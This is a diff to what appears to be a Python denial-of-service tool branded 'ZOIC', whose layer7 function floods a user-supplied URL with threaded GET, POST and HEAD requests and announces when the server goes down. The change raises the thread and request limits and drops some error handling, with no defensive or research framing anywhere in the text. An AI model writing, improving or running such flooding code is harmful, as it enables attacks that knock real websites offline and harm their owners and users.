@@ -128,8 +128,6 @@ def layer7():
                     print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                 except aiohttp.client_exceptions.ServerDisconnectedError:
                     print(TextColors.CRIMSON + f"[-] Server disconnected ZOIC !!" + TextColors.RESET)
-                except Exception as e:
-                    print(TextColors.CRIMSON + f"[-] Unexpected error: {str(e)}" + TextColors.RESET)
 
             async def send_requests(url, get_requests):
                 async with aiohttp.ClientSession() as session:
@@ -151,8 +149,8 @@ def layer7():
                     thread.join()  
 
             url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
-            threads = int(input(TextColors.WHITE + "Thread (5~30) > "+ TextColors.RESET))  
-            get_requests = int(input(TextColors.WHITE + "Get (5~30) > "+ TextColors.RESET))    
+            threads = int(input(TextColors.WHITE + "Thread (5~35) > "+ TextColors.RESET))  
+            get_requests = int(input(TextColors.WHITE + "Get (5~35) > "+ TextColors.RESET))    
 
             start_threads(url, threads, get_requests)
 
@@ -169,8 +167,6 @@ def layer7():
                     print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                 except aiohttp.client_exceptions.ServerDisconnectedError:
                     print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC !!" + TextColors.RESET)
-                except Exception as e:
-                    print(TextColors.CRIMSON + f"[-] Unexpected error : {str(e)}" + TextColors.RESET)
 
             async def send_requests(url, num_requests):
                 async with aiohttp.ClientSession() as session:
@@ -192,8 +188,8 @@ def layer7():
                     thread.join()
 
             url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
-            threads = int(input(TextColors.WHITE + "Thread (5~30) > "+ TextColors.RESET))  
-            post_requests = int(input(TextColors.WHITE + "Get (5~30) > "+ TextColors.RESET))   
+            threads = int(input(TextColors.WHITE + "Thread (5~35) > "+ TextColors.RESET))  
+            post_requests = int(input(TextColors.WHITE + "Get (5~35) > "+ TextColors.RESET))   
 
             start_threads(url, threads, post_requests)
 
@@ -209,8 +205,6 @@ def layer7():
                     print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                 except aiohttp.client_exceptions.ServerDisconnectedError:
                     print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC !!" + TextColors.RESET)
-                except Exception as e:
-                    print(TextColors.CRIMSON + f"[-] Unexpected error: {str(e)}" + TextColors.RESET)
 
             async def send_requests(url, num_requests):
                 async with aiohttp.ClientSession() as session:
@@ -232,8 +226,8 @@ def layer7():
                     thread.join()
 
             url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
-            threads = int(input(TextColors.WHITE + "Thread (5~30) > "+ TextColors.RESET))  
-            head_requests = int(input(TextColors.WHITE + "Get (5~30) > "+ TextColors.RESET))  
+            threads = int(input(TextColors.WHITE + "Thread (5~35) > "+ TextColors.RESET))  
+            head_requests = int(input(TextColors.WHITE + "Get (5~35) > "+ TextColors.RESET))  
 
             start_threads(url, threads, head_requests)
 
